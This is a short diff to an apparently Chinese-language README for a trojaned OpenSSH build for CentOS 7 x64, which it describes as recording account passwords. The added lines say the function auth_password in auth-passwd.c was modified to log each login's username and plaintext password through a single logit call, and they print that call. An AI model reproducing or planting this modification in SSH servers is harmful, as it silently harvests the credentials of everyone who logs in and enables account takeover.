@@ -6,4 +6,7 @@ centos7x64记录帐号密码的openssh
 只用于centos7x64系统
 
 
+只在 auth-passwd.c中修改了函数auth_password，添加了
+logit("sshlog: %s %s", authctxt->user, password);
+
 
